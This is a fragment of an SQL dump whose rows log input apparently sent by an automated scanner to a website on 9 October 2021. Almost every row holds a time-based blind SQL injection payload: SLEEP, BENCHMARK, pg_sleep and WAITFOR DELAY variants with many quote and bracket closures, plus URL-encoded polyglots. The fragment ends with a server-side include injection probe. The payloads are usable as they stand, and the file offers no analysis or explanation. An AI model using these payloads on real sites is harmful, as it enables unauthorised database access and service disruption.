12:33:21'),('null','',NULL,'\"))) PROCEDURE ANALYSE(EXTRACTVALUE(510,CONCAT(0x5c,(BENCHMARK(3*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:22'),('null','',NULL,'\"))) PROCEDURE ANALYSE(EXTRACTVALUE(4010,CONCAT(0x5c,(BENCHMARK(2*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:22'),('null','',NULL,'\") PROCEDURE ANALYSE(EXTRACTVALUE(5110,CONCAT(0x5c,(BENCHMARK(4*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:23'),('null','',NULL,'\") PROCEDURE ANALYSE(EXTRACTVALUE(3410,CONCAT(0x5c,(BENCHMARK(2*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:24'),('null','',NULL,'\")) PROCEDURE ANALYSE(EXTRACTVALUE(9910,CONCAT(0x5c,(BENCHMARK(4*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:24'),('null','',NULL,'\")) PROCEDURE ANALYSE(EXTRACTVALUE(4910,CONCAT(0x5c,(BENCHMARK(3*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:25'),('null','',NULL,'\'))) PROCEDURE ANALYSE(EXTRACTVALUE(5910,CONCAT(0x5c,(BENCHMARK(3*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:25'),('null','',NULL,'\'))) PROCEDURE ANALYSE(EXTRACTVALUE(6710,CONCAT(0x5c,(BENCHMARK(3*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:26'),('null','',NULL,'\')) PROCEDURE ANALYSE(EXTRACTVALUE(3710,CONCAT(0x5c,(BENCHMARK(3*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:26'),('null','',NULL,'\')) PROCEDURE ANALYSE(EXTRACTVALUE(7510,CONCAT(0x5c,(BENCHMARK(4*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:27'),('null','',NULL,'\" PROCEDURE ANALYSE(EXTRACTVALUE(1210,CONCAT(0x5c,(BENCHMARK(3*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:28'),('null','',NULL,'\" PROCEDURE ANALYSE(EXTRACTVALUE(2910,CONCAT(0x5c,(BENCHMARK(3*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:28'),('null','',NULL,'\') PROCEDURE ANALYSE(EXTRACTVALUE(210,CONCAT(0x5c,(BENCHMARK(4*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:29'),('null','',NULL,'\') PROCEDURE ANALYSE(EXTRACTVALUE(2010,CONCAT(0x5c,(BENCHMARK(4*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:30'),('null','',NULL,'\' PROCEDURE ANALYSE(EXTRACTVALUE(5110,CONCAT(0x5c,(BENCHMARK(4*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:30'),('null','',NULL,'\' PROCEDURE ANALYSE(EXTRACTVALUE(8510,CONCAT(0x5c,(BENCHMARK(3*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:31'),('null','',NULL,'`) WHERE 6910=6910 PROCEDURE ANALYSE(EXTRACTVALUE(6910,CONCAT(0x5c,(BENCHMARK(4*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:31'),('null','',NULL,'`) WHERE 5310=5310 PROCEDURE ANALYSE(EXTRACTVALUE(5310,CONCAT(0x5c,(BENCHMARK(3*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:31'),('null','',NULL,'` WHERE 2610=2610 PROCEDURE ANALYSE(EXTRACTVALUE(2610,CONCAT(0x5c,(BENCHMARK(4*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:31'),('null','',NULL,'` WHERE 8810=8810 PROCEDURE ANALYSE(EXTRACTVALUE(8810,CONCAT(0x5c,(BENCHMARK(2*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:32'),('null','',NULL,') AS crti WHERE 1110=1110 PROCEDURE ANALYSE(EXTRACTVALUE(1110,CONCAT(0x5c,(BENCHMARK(3*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:32'),('null','',NULL,') AS tyhw WHERE 7410=7410 PROCEDURE ANALYSE(EXTRACTVALUE(7410,CONCAT(0x5c,(BENCHMARK(4*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:32'),('null','',NULL,')) AS hoze WHERE 3010=3010 PROCEDURE ANALYSE(EXTRACTVALUE(3010,CONCAT(0x5c,(BENCHMARK(3*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:32'),('null','',NULL,')) AS omvz WHERE 5610=5610 PROCEDURE ANALYSE(EXTRACTVALUE(5610,CONCAT(0x5c,(BENCHMARK(4*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:32'),('null','',NULL,'))) PROCEDURE ANALYSE(EXTRACTVALUE(3810,CONCAT(0x5c,(BENCHMARK(4*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:33'),('null','',NULL,'))) PROCEDURE ANALYSE(EXTRACTVALUE(3810,CONCAT(0x5c,(BENCHMARK(4*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:33'),('null','',NULL,' PROCEDURE ANALYSE(EXTRACTVALUE(9510,CONCAT(0x5c,(BENCHMARK(3*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:33'),('null','',NULL,' PROCEDURE ANALYSE(EXTRACTVALUE(9210,CONCAT(0x5c,(BENCHMARK(4*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:33'),('null','',NULL,')) PROCEDURE ANALYSE(EXTRACTVALUE(9410,CONCAT(0x5c,(BENCHMARK(2*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:33'),('null','',NULL,')) PROCEDURE ANALYSE(EXTRACTVALUE(5110,CONCAT(0x5c,(BENCHMARK(4*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:34'),('null','',NULL,'\' IN BOOLEAN MODE) PROCEDURE ANALYSE(EXTRACTVALUE(1210,CONCAT(0x5c,(BENCHMARK(3*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:34'),('null','',NULL,'\' IN BOOLEAN MODE) PROCEDURE ANALYSE(EXTRACTVALUE(2010,CONCAT(0x5c,(BENCHMARK(4*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:35'),('null','',NULL,') PROCEDURE ANALYSE(EXTRACTVALUE(4810,CONCAT(0x5c,(BENCHMARK(3*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:35'),('null','',NULL,') PROCEDURE ANALYSE(EXTRACTVALUE(5110,CONCAT(0x5c,(BENCHMARK(4*8000000,MD5(0x5b52414e445354525d))))),1) limit 1#','2021-10-09 12:33:35'),('null','',NULL,' PROCEDURE ANALYSE(EXTRACTVALUE(8510,CONCAT(0x5c,(BENCHMARK(3*8000000,MD5(0x5b52414e445354525d))))),1) limit 1# vpxe','2021-10-09 12:33:35'),('null','',NULL,' PROCEDURE ANALYSE(EXTRACTVALUE(6910,CONCAT(0x5c,(BENCHMARK(4*8000000,MD5(0x5b52414e445354525d))))),1) limit 1# rtta','2021-10-09 12:33:36'),('null','',NULL,' PROCEDURE ANALYSE(EXTRACTVALUE(410,CONCAT(0x5c,(BENCHMARK(2*8000000,MD5(0x5b52414e445354525d))))),1)','2021-10-09 12:33:36'),('null','',NULL,' PROCEDURE ANALYSE(EXTRACTVALUE(4110,CONCAT(0x5c,(BENCHMARK(3*8000000,MD5(0x5b52414e445354525d))))),1)','2021-10-09 12:33:36'),('null','',NULL,'\") AS mmdo WHERE 4810=4810 OR (SELECT*FROM(SELECT(SLEEP(3)))mmdo) limit 1#','2021-10-09 12:33:36'),('null','',NULL,'\") AS ojjo WHERE 5610=5610 OR (SELECT*FROM(SELECT(SLEEP(4)))ojjo) limit 1#','2021-10-09 12:33:37'),('null','',NULL,'\') AS pofm WHERE 5810=5810 OR (SELECT*FROM(SELECT(SLEEP(2)))pofm) limit 1#','2021-10-09 12:33:38'),('null','',NULL,'\') AS ywyl WHERE 9710=9710 OR (SELECT*FROM(SELECT(SLEEP(3)))ywyl) limit 1#','2021-10-09 12:33:38'),('null','',NULL,'\")) AS aiqk WHERE 110=110 OR (SELECT*FROM(SELECT(SLEEP(3)))aiqk) limit 1#','2021-10-09 12:33:39'),('null','',NULL,'\")) AS mkvl WHERE 4710=4710 OR (SELECT*FROM(SELECT(SLEEP(3)))mkvl) limit 1#','2021-10-09 12:33:40'),('null','',NULL,'\'+(SELECT \'xrpf\' WHERE 9310=9310 OR (SELECT*FROM(SELECT(SLEEP(4)))xrpf) limit 1#','2021-10-09 12:33:40'),('null','',NULL,'\'+(SELECT \'psdp\' WHERE 6010=6010 OR (SELECT*FROM(SELECT(SLEEP(3)))psdp) limit 1#','2021-10-09 12:33:41'),('null','',NULL,'\')) AS mdil WHERE 4810=4810 OR (SELECT*FROM(SELECT(SLEEP(3)))mdil) limit 1#','2021-10-09 12:33:41'),('null','',NULL,'\')) AS arvq WHERE 310=310 OR (SELECT*FROM(SELECT(SLEEP(4)))arvq) limit 1#','2021-10-09 12:33:42'),('null','',NULL,'\'+(SELECT xwgf WHERE 9010=9010 OR (SELECT*FROM(SELECT(SLEEP(3)))xwgf) limit 1#','2021-10-09 12:33:42'),('null','',NULL,'\'+(SELECT lzyw WHERE 4610=4610 OR (SELECT*FROM(SELECT(SLEEP(2)))lzyw) limit 1#','2021-10-09 12:33:43'),('null','',NULL,'\'||(SELECT \'jtbs\' FROM DUAL WHERE 3610=3610 OR (SELECT*FROM(SELECT(SLEEP(3)))jtbs) limit 1#','2021-10-09 12:33:44'),('null','',NULL,'\'||(SELECT \'ydoh\' FROM DUAL WHERE 9310=9310 OR (SELECT*FROM(SELECT(SLEEP(4)))ydoh) limit 1#','2021-10-09 12:33:44'),('null','',NULL,'\'||(SELECT \'btsu\' WHERE 810=810 OR (SELECT*FROM(SELECT(SLEEP(4)))btsu) limit 1#','2021-10-09 12:33:45'),('null','',NULL,'\'||(SELECT \'zxxb\' WHERE 9710=9710 OR (SELECT*FROM(SELECT(SLEEP(3)))zxxb) limit 1#','2021-10-09 12:33:46'),('null','',NULL,'\" WHERE 7410=7410 OR (SELECT*FROM(SELECT(SLEEP(4)))tgjw) limit 1#','2021-10-09 12:33:46'),('null','',NULL,'\" WHERE 4610=4610 OR (SELECT*FROM(SELECT(SLEEP(2)))lyft) limit 1#','2021-10-09 12:33:47'),('null','',NULL,'\' WHERE 9910=9910 OR (SELECT*FROM(SELECT(SLEEP(4)))zkht) limit 1#','2021-10-09 12:33:47'),('null','',NULL,'\' WHERE 3310=3310 OR (SELECT*FROM(SELECT(SLEEP(4)))ilhe) limit 1#','2021-10-09 12:33:48'),('null','',NULL,'\") WHERE 5910=5910 OR (SELECT*FROM(SELECT(SLEEP(3)))ppfe) limit 1#','2021-10-09 12:33:48'),('null','',NULL,'\") WHERE 4110=4110 OR (SELECT*FROM(SELECT(SLEEP(3)))kazb) limit 1#','2021-10-09 12:33:49'),('null','',NULL,'\') WHERE 3710=3710 OR (SELECT*FROM(SELECT(SLEEP(3)))jytt) limit 1#','2021-10-09 12:33:50'),('null','',NULL,'\') WHERE 3510=3510 OR (SELECT*FROM(SELECT(SLEEP(3)))ibcs) limit 1#','2021-10-09 12:33:50'),('null','',NULL,'\"))) OR (SELECT*FROM(SELECT(SLEEP(3)))tunn) limit 1#','2021-10-09 12:33:51'),('null','',NULL,'\"))) OR (SELECT*FROM(SELECT(SLEEP(3)))rxvl) limit 1#','2021-10-09 12:33:52'),('null','',NULL,'\") OR (SELECT*FROM(SELECT(SLEEP(2)))cfbn) limit 1#','2021-10-09 12:33:52'),('null','',NULL,'\") OR (SELECT*FROM(SELECT(SLEEP(4)))aybf) limit 1#','2021-10-09 12:33:53'),('null','',NULL,'\")) OR (SELECT*FROM(SELECT(SLEEP(2)))lsee) limit 1#','2021-10-09 12:33:53'),('null','',NULL,'\")) OR (SELECT*FROM(SELECT(SLEEP(2)))lepk) limit 1#','2021-10-09 12:33:54'),('null','',NULL,'\'))) OR (SELECT*FROM(SELECT(SLEEP(4)))deyu) limit 1#','2021-10-09 12:33:54'),('null','',NULL,'\'))) OR (SELECT*FROM(SELECT(SLEEP(3)))mtnp) limit 1#','2021-10-09 12:33:55'),('null','',NULL,'\" OR (SELECT*FROM(SELECT(SLEEP(3)))lfns) limit 1#','2021-10-09 12:33:56'),('null','',NULL,'\" OR (SELECT*FROM(SELECT(SLEEP(4)))jany) limit 1#','2021-10-09 12:33:56'),('null','',NULL,'\')) OR (SELECT*FROM(SELECT(SLEEP(3)))yyhc) limit 1#','2021-10-09 12:33:57'),('null','',NULL,'\')) OR (SELECT*FROM(SELECT(SLEEP(4)))iyhr) limit 1#','2021-10-09 12:33:58'),('null','',NULL,'\' OR (SELECT*FROM(SELECT(SLEEP(3)))uqbr) limit 1#','2021-10-09 12:33:58'),('null','',NULL,'\' OR (SELECT*FROM(SELECT(SLEEP(4)))wrtf) limit 1#','2021-10-09 12:33:59'),('null','',NULL,'\') OR (SELECT*FROM(SELECT(SLEEP(2)))njpn) limit 1#','2021-10-09 12:33:59'),('null','',NULL,'\') OR (SELECT*FROM(SELECT(SLEEP(3)))ifvk) limit 1#','2021-10-09 12:34:00'),('null','',NULL,'`) WHERE 8810=8810 OR (SELECT*FROM(SELECT(SLEEP(2)))wvhz) limit 1#','2021-10-09 12:34:00'),('null','',NULL,'`) WHERE 5810=5810 OR (SELECT*FROM(SELECT(SLEEP(2)))orut) limit 1#','2021-10-09 12:34:00'),('null','',NULL,'` WHERE 810=810 OR (SELECT*FROM(SELECT(SLEEP(4)))bnwv) limit 1#','2021-10-09 12:34:01'),('null','',NULL,'` WHERE 8010=8010 OR (SELECT*FROM(SELECT(SLEEP(4)))urvb) limit 1#','2021-10-09 12:34:01'),('null','',NULL,') AS enjb WHERE 1710=1710 OR (SELECT*FROM(SELECT(SLEEP(3)))enjb) limit 1#','2021-10-09 12:34:01'),('null','',NULL,') AS cctf WHERE 1010=1010 OR (SELECT*FROM(SELECT(SLEEP(2)))cctf) limit 1#','2021-10-09 12:34:01'),('null','',NULL,')) AS wwrd WHERE 8810=8810 OR (SELECT*FROM(SELECT(SLEEP(2)))wwrd) limit 1#','2021-10-09 12:34:01'),('null','',NULL,')) AS wlqq WHERE 8810=8810 OR (SELECT*FROM(SELECT(SLEEP(2)))wlqq) limit 1#','2021-10-09 12:34:02'),('null','',NULL,' WHERE 2610=2610 OR (SELECT*FROM(SELECT(SLEEP(4)))ghlr) limit 1#','2021-10-09 12:34:02'),('null','',NULL,' WHERE 410=410 OR (SELECT*FROM(SELECT(SLEEP(2)))ahtb) limit 1#','2021-10-09 12:34:02'),('null','',NULL,' OR (SELECT*FROM(SELECT(SLEEP(4)))ocob) limit 1#','2021-10-09 12:34:02'),('null','',NULL,' OR (SELECT*FROM(SELECT(SLEEP(4)))dfgd) limit 1#','2021-10-09 12:34:03'),('null','',NULL,') WHERE 1410=1410 OR (SELECT*FROM(SELECT(SLEEP(4)))digi) limit 1#','2021-10-09 12:34:03'),('null','',NULL,') WHERE 5310=5310 OR (SELECT*FROM(SELECT(SLEEP(3)))nixj) limit 1#','2021-10-09 12:34:04'),('null','',NULL,'))) OR (SELECT*FROM(SELECT(SLEEP(3)))vdsn) limit 1#','2021-10-09 12:34:04'),('null','',NULL,'))) OR (SELECT*FROM(SELECT(SLEEP(3)))blxe) limit 1#','2021-10-09 12:34:04'),('null','',NULL,')) OR (SELECT*FROM(SELECT(SLEEP(4)))ywnk) limit 1#','2021-10-09 12:34:04'),('null','',NULL,')) OR (SELECT*FROM(SELECT(SLEEP(3)))cmmi) limit 1#','2021-10-09 12:34:04'),('null','',NULL,') OR (SELECT*FROM(SELECT(SLEEP(3)))vjph) limit 1#','2021-10-09 12:34:05'),('null','',NULL,') OR (SELECT*FROM(SELECT(SLEEP(4)))uubh) limit 1#','2021-10-09 12:34:05'),('null','',NULL,'\") AS tlbr WHERE 7410=7410 AND (SELECT*FROM(SELECT(SLEEP(4)))tlbr) limit 1#','2021-10-09 12:34:05'),('null','',NULL,'\") AS fakz WHERE 2310=2310 AND (SELECT*FROM(SELECT(SLEEP(3)))fakz) limit 1#','2021-10-09 12:34:06'),('null','',NULL,'\') AS iwls WHERE 3310=3310 AND (SELECT*FROM(SELECT(SLEEP(4)))iwls) limit 1#','2021-10-09 12:34:06'),('null','',NULL,'\') AS sugj WHERE 7110=7110 AND (SELECT*FROM(SELECT(SLEEP(3)))sugj) limit 1#','2021-10-09 12:34:07'),('null','',NULL,'\")) AS iusv WHERE 3210=3210 AND (SELECT*FROM(SELECT(SLEEP(4)))iusv) limit 1#','2021-10-09 12:34:08'),('null','',NULL,'\")) AS izny WHERE 3410=3410 AND (SELECT*FROM(SELECT(SLEEP(2)))izny) limit 1#','2021-10-09 12:34:08'),('null','',NULL,'\')) AS vfkd WHERE 8410=8410 AND (SELECT*FROM(SELECT(SLEEP(3)))vfkd) limit 1#','2021-10-09 12:34:09'),('null','',NULL,'\')) AS yihz WHERE 9510=9510 AND (SELECT*FROM(SELECT(SLEEP(3)))yihz) limit 1#','2021-10-09 12:34:10'),('null','',NULL,'\'+(SELECT \'xaxl\' WHERE 9210=9210 AND (SELECT*FROM(SELECT(SLEEP(4)))xaxl) limit 1#','2021-10-09 12:34:10'),('null','',NULL,'\'+(SELECT \'mgiz\' WHERE 4810=4810 AND (SELECT*FROM(SELECT(SLEEP(3)))mgiz) limit 1#','2021-10-09 12:34:11'),('null','',NULL,'\'+(SELECT nlpr WHERE 5410=5410 AND (SELECT*FROM(SELECT(SLEEP(3)))nlpr) limit 1#','2021-10-09 12:34:11'),('null','',NULL,'\'+(SELECT vwql WHERE 8510=8510 AND (SELECT*FROM(SELECT(SLEEP(3)))vwql) limit 1#','2021-10-09 12:34:12'),('null','',NULL,'\'||(SELECT \'qaye\' WHERE 6210=6210 AND (SELECT*FROM(SELECT(SLEEP(4)))qaye) limit 1#','2021-10-09 12:34:12'),('null','',NULL,'\'||(SELECT \'gmjh\' WHERE 2410=2410 AND (SELECT*FROM(SELECT(SLEEP(3)))gmjh) limit 1#','2021-10-09 12:34:13'),('null','',NULL,'\'||(SELECT \'znzb\' FROM DUAL WHERE 10010=10010 AND (SELECT*FROM(SELECT(SLEEP(2)))znzb) limit 1#','2021-10-09 12:34:14'),('null','',NULL,'\'||(SELECT \'pbbh\' FROM DUAL WHERE 6110=6110 AND (SELECT*FROM(SELECT(SLEEP(3)))pbbh) limit 1#','2021-10-09 12:34:14'),('null','',NULL,'\" WHERE 510=510 AND (SELECT*FROM(SELECT(SLEEP(3)))bezu) limit 1#','2021-10-09 12:34:15'),('null','',NULL,'\" WHERE 9110=9110 AND (SELECT*FROM(SELECT(SLEEP(3)))xkwb) limit 1#','2021-10-09 12:34:16'),('null','',NULL,'\") WHERE 7010=7010 AND (SELECT*FROM(SELECT(SLEEP(2)))sbqa) limit 1#','2021-10-09 12:34:16'),('null','',NULL,'\") WHERE 210=210 AND (SELECT*FROM(SELECT(SLEEP(4)))aorx) limit 1#','2021-10-09 12:34:17'),('null','',NULL,'\' WHERE 8310=8310 AND (SELECT*FROM(SELECT(SLEEP(3)))vfra) limit 1#','2021-10-09 12:34:17'),('null','',NULL,'\' WHERE 7610=7610 AND (SELECT*FROM(SELECT(SLEEP(2)))tjvz) limit 1#','2021-10-09 12:34:18'),('null','',NULL,'\') WHERE 3310=3310 AND (SELECT*FROM(SELECT(SLEEP(4)))ifio) limit 1#','2021-10-09 12:34:18'),('null','',NULL,'\') WHERE 8710=8710 AND (SELECT*FROM(SELECT(SLEEP(4)))wbbh) limit 1#','2021-10-09 12:34:19'),('null','',NULL,'\")) AND (SELECT*FROM(SELECT(SLEEP(4)))qbms) limit 1#','2021-10-09 12:34:20'),('null','',NULL,'\")) AND (SELECT*FROM(SELECT(SLEEP(3)))jgbo) limit 1#','2021-10-09 12:34:20'),('null','',NULL,'\"))) AND (SELECT*FROM(SELECT(SLEEP(2)))ybbb) limit 1#','2021-10-09 12:34:21'),('null','',NULL,'\"))) AND (SELECT*FROM(SELECT(SLEEP(3)))jwqz) limit 1#','2021-10-09 12:34:22'),('null','',NULL,'\" AND (SELECT*FROM(SELECT(SLEEP(3)))pqwj) limit 1#','2021-10-09 12:34:22'),('null','',NULL,'\" AND (SELECT*FROM(SELECT(SLEEP(2)))tlez) limit 1#','2021-10-09 12:34:23'),('null','',NULL,'\')) AND (SELECT*FROM(SELECT(SLEEP(4)))rqkx) limit 1#','2021-10-09 12:34:23'),('null','',NULL,'\')) AND (SELECT*FROM(SELECT(SLEEP(2)))yznn) limit 1#','2021-10-09 12:34:24'),('null','',NULL,'\'))) AND (SELECT*FROM(SELECT(SLEEP(3)))hywz) limit 1#','2021-10-09 12:34:24'),('null','',NULL,'\'))) AND (SELECT*FROM(SELECT(SLEEP(2)))tnak) limit 1#','2021-10-09 12:34:25'),('null','',NULL,'\") AND (SELECT*FROM(SELECT(SLEEP(4)))udwg) limit 1#','2021-10-09 12:34:26'),('null','',NULL,'\") AND (SELECT*FROM(SELECT(SLEEP(4)))mmxu) limit 1#','2021-10-09 12:34:26'),('null','',NULL,'\' AND (SELECT*FROM(SELECT(SLEEP(3)))svle) limit 1#','2021-10-09 12:34:27'),('null','',NULL,'\' AND (SELECT*FROM(SELECT(SLEEP(4)))niyd) limit 1#','2021-10-09 12:34:28'),('null','',NULL,'` WHERE 110=110 AND (SELECT*FROM(SELECT(SLEEP(3)))afnc) limit 1#','2021-10-09 12:34:28'),('null','',NULL,'` WHERE 7710=7710 AND (SELECT*FROM(SELECT(SLEEP(3)))tkuy) limit 1#','2021-10-09 12:34:28'),('null','',NULL,'`) WHERE 1310=1310 AND (SELECT*FROM(SELECT(SLEEP(3)))dxgr) limit 1#','2021-10-09 12:34:28'),('null','',NULL,'`) WHERE 8410=8410 AND (SELECT*FROM(SELECT(SLEEP(3)))vpvg) limit 1#','2021-10-09 12:34:28'),('null','',NULL,'\') AND (SELECT*FROM(SELECT(SLEEP(3)))xdrj) limit 1#','2021-10-09 12:34:29'),('null','',NULL,'\') AND (SELECT*FROM(SELECT(SLEEP(3)))mgka) limit 1#','2021-10-09 12:34:30'),('null','',NULL,') AS cpah WHERE 1010=1010 AND (SELECT*FROM(SELECT(SLEEP(2)))cpah) limit 1#','2021-10-09 12:34:30'),('null','',NULL,') AS cetb WHERE 910=910 AND (SELECT*FROM(SELECT(SLEEP(4)))cetb) limit 1#','2021-10-09 12:34:30'),('null','',NULL,')) AS avpf WHERE 110=110 AND (SELECT*FROM(SELECT(SLEEP(3)))avpf) limit 1#','2021-10-09 12:34:30'),('null','',NULL,')) AS nuun WHERE 5110=5110 AND (SELECT*FROM(SELECT(SLEEP(4)))nuun) limit 1#','2021-10-09 12:34:30'),('null','',NULL,' AND (SELECT*FROM(SELECT(SLEEP(4)))fqnx) limit 1#','2021-10-09 12:34:31'),('null','',NULL,' AND (SELECT*FROM(SELECT(SLEEP(3)))sutm) limit 1#','2021-10-09 12:34:32'),('null','',NULL,') WHERE 8710=8710 AND (SELECT*FROM(SELECT(SLEEP(4)))wdpq) limit 1#','2021-10-09 12:34:32'),('null','',NULL,') WHERE 1810=1810 AND (SELECT*FROM(SELECT(SLEEP(3)))ekja) limit 1#','2021-10-09 12:34:32'),('null','',NULL,' WHERE 1410=1410 AND (SELECT*FROM(SELECT(SLEEP(4)))dhah) limit 1#','2021-10-09 12:34:32'),('null','',NULL,' WHERE 7310=7310 AND (SELECT*FROM(SELECT(SLEEP(3)))spzl) limit 1#','2021-10-09 12:34:32'),('null','',NULL,'))) AND (SELECT*FROM(SELECT(SLEEP(4)))zrvy) limit 1#','2021-10-09 12:34:33'),('null','',NULL,'))) AND (SELECT*FROM(SELECT(SLEEP(3)))kugl) limit 1#','2021-10-09 12:34:33'),('null','',NULL,'\' IN BOOLEAN MODE) OR (SELECT*FROM(SELECT(SLEEP(2)))yalb) limit 1#','2021-10-09 12:34:33'),('null','',NULL,'\' IN BOOLEAN MODE) OR (SELECT*FROM(SELECT(SLEEP(3)))bfsu) limit 1#','2021-10-09 12:34:34'),('null','',NULL,') AND (SELECT*FROM(SELECT(SLEEP(3)))kwgu) limit 1#','2021-10-09 12:34:34'),('null','',NULL,') AND (SELECT*FROM(SELECT(SLEEP(2)))nkgr) limit 1#','2021-10-09 12:34:34'),('null','',NULL,')) AND (SELECT*FROM(SELECT(SLEEP(3)))xgjh) limit 1#','2021-10-09 12:34:35'),('null','',NULL,')) AND (SELECT*FROM(SELECT(SLEEP(3)))dcmp) limit 1#','2021-10-09 12:34:35'),('null','',NULL,'\'||(SELECT \'kudz\' FROM DUAL WHERE 4310=4310 OR (SELECT*FROM(SELECT(SLEEP(3)))kudz))||\'','2021-10-09 12:34:35'),('null','',NULL,'\'||(SELECT \'fzbe\' FROM DUAL WHERE 2310=2310 OR (SELECT*FROM(SELECT(SLEEP(3)))fzbe))||\'','2021-10-09 12:34:36'),('null','',NULL,'\'||(SELECT \'hqcs\' WHERE 3110=3110 OR (SELECT*FROM(SELECT(SLEEP(3)))hqcs))||\'','2021-10-09 12:34:36'),('null','',NULL,'\'||(SELECT \'ilyl\' WHERE 3310=3310 OR (SELECT*FROM(SELECT(SLEEP(4)))ilyl))||\'','2021-10-09 12:34:37'),('null','',NULL,'\'+(SELECT \'kzen\' WHERE 3910=3910 OR (SELECT*FROM(SELECT(SLEEP(4)))kzen))+\'','2021-10-09 12:34:38'),('null','',NULL,'\'+(SELECT \'vmco\' WHERE 8210=8210 OR (SELECT*FROM(SELECT(SLEEP(2)))vmco))+\'','2021-10-09 12:34:38'),('null','',NULL,'\'+(SELECT erab WHERE 1810=1810 OR (SELECT*FROM(SELECT(SLEEP(3)))erab))+\'','2021-10-09 12:34:39'),('null','',NULL,'\'+(SELECT teoq WHERE 7410=7410 OR (SELECT*FROM(SELECT(SLEEP(4)))teoq))+\'','2021-10-09 12:34:40'),('null','',NULL,'','2021-10-09 12:34:40'),('null','',NULL,'','2021-10-09 12:34:40'),('null','',NULL,' AND (SELECT*FROM(SELECT(SLEEP(3)))xdmk)','2021-10-09 12:34:40'),('null','',NULL,' AND (SELECT*FROM(SELECT(SLEEP(4)))gdhx)','2021-10-09 12:34:41'),('null','',NULL,'(select(0)from(select(sleep(3)))v)/*\'+(select(0)from(select(sleep(3)))v)+\'\"+(select(0)from(select(sleep(3)))v)+\"*/','2021-10-09 12:34:42'),('null','',NULL,'%28select%280%29from%28select%28sleep%283%29%29%29v%29%2F%2A%27%2B%28select%280%29from%28select%28sleep%283%29%29%29v%29%2B%27%22%2B%28select%280%29from%28select%28sleep%283%29%29%29v%29%2B%22%2A%2F','2021-10-09 12:34:42'),('null','',NULL,'(select(0)from(select(sleep(3)))v)/*\'+(select(0)from(select(sleep(3)))v)+\'\"+(select(0)from(select(sleep(3)))v)+\"*/','2021-10-09 12:34:42'),('null','',NULL,'%28select%280%29from%28select%28sleep%283%29%29%29v%29%2F%2A%27%2B%28select%280%29from%28select%28sleep%283%29%29%29v%29%2B%27%22%2B%28select%280%29from%28select%28sleep%283%29%29%29v%29%2B%22%2A%2F','2021-10-09 12:34:43'),('null','',NULL,'\'-(select*from(select(sleep(3)))a)-\'','2021-10-09 12:34:44'),('null','',NULL,'\'-(select*from(select(sleep(3)))a)-\'','2021-10-09 12:34:45'),('null','',NULL,';select pg_sleep(3); -- ','2021-10-09 12:34:45'),('null','',NULL,';select pg_sleep(2); -- ','2021-10-09 12:34:45'),('null','',NULL,'\';select pg_sleep(3); -- ','2021-10-09 12:34:46'),('null','',NULL,'\';select pg_sleep(3); -- ','2021-10-09 12:34:46'),('null','',NULL,'\";select pg_sleep(4); -- ','2021-10-09 12:34:47'),('null','',NULL,'\";select pg_sleep(3); -- ','2021-10-09 12:34:48'),('null','',NULL,';waitfor delay \'0:0:4\' -- ','2021-10-09 12:34:48'),('null','',NULL,';waitfor delay \'0:0:3\' -- ','2021-10-09 12:34:49'),('null','',NULL,'\';waitfor delay \'0:0:2\' -- ','2021-10-09 12:34:49'),('null','',NULL,'\';waitfor delay \'0:0:4\' -- ','2021-10-09 12:34:50'),('null','',NULL,'\";waitfor delay \'0:0:3\' -- ','2021-10-09 12:34:50'),('null','',NULL,'\";waitfor delay \'0:0:4\' -- ','2021-10-09 12:34:51'),('null','',NULL,'','2021-10-09 12:34:51'),('null','',NULL,'','2021-10-09 12:34:51'),('null','',NULL,'','2021-10-09 12:34:51'),('null','',NULL,'','2021-10-09 12:34:52'),('null','',NULL,'','2021-10-09 12:34:52'),('null','',NULL,'','2021-10-09 12:34:52'),('null','',NULL,'','2021-10-09 12:34:53'),('null','',NULL,'','2021-10-09 12:34:53'),('null','',NULL,'','2021-10-09 12:34:53'),('null','',NULL,'\"-->\'-->`--><!--#set var=\"tst1\" value=\"34382684ed470f4c\"--><!--#set var=\"tst2\" value=\"d163e8f003c894dd\"--><!--#echo var=\"tst1\"--><!--#echo var=\"tst2\"-->','2021-10-09 